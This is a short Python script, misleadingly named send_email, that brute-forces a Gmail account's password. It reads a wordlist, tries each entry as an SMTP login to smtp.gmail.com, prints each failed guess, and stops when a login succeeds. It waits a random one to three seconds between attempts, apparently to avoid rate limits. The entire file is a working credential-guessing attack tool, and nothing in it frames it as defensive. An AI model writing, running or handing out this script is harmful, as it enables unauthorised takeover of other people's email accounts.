import smtplib
import os
import time
import random

# SMTP Server Configuration
SMTP_SERVER = 'smtp.gmail.com'  
SMTP_PORT = 587  

def send_email(mail, password_file):
    try:
        # Convert relative path to absolute path
        password_file = os.path.abspath(password_file)

        # Check if file exists
        if not os.path.exists(password_file):
            print(f"Error: File '{password_file}' not found.")
            return
        
        with open(password_file, 'r', encoding='utf-8') as file:
            for password in file:
                password = password.strip()  # Remove newlines and spaces

                if not password:  # Skip empty lines
                    continue

                try:
                    # Connect to email server and attempt login
                    smtp_session = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
                    smtp_session.starttls()
                    smtp_session.login(mail, password)
                    
                    print(f"Correct Password Found: {password}")
                    smtp_session.quit()
                    return  # Stop testing after finding the correct password

                except smtplib.SMTPAuthenticationError:
                    print(f"Incorrect Password: {password}")
                time.sleep(random.uniform(1,3))

    except FileNotFoundError:
        print(f"Error: File '{password_file}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    email = input("Enter Email: ").strip()
    dictionary = input("Enter Dictionary File Path: ").strip()

    send_email(email, dictionary)
